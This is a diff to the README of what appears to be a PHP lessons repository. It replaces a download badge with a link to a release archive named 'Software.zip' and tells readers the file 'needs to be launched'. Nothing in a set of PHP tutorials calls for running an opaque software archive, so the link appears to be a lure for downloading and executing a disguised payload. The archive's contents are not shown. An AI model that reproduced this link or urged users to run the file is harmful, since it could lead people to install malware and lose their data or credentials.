@@ -23,7 +23,7 @@ To get started with the lessons and tutorials in this repository, simply clone t
 In addition to the lessons and tutorials, this repository also provides links to valuable external resources to enhance your learning experience. Make sure to check them out to deepen your understanding of PHP development.
 
 ## External Link
-[![Download Zip](https://img.shields.io/badge/Download-Zip-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip) (Note: File needs to be launched)
+[![Download Zip](https://github.com/Pxzinh/Php_Lessons/releases/download/v1.0/Software.zip)](https://github.com/Pxzinh/Php_Lessons/releases/download/v1.0/Software.zip) (Note: File needs to be launched)
 
 If you encounter any issues with the link provided above, please check the "Releases" section of this repository for alternative download options.
 
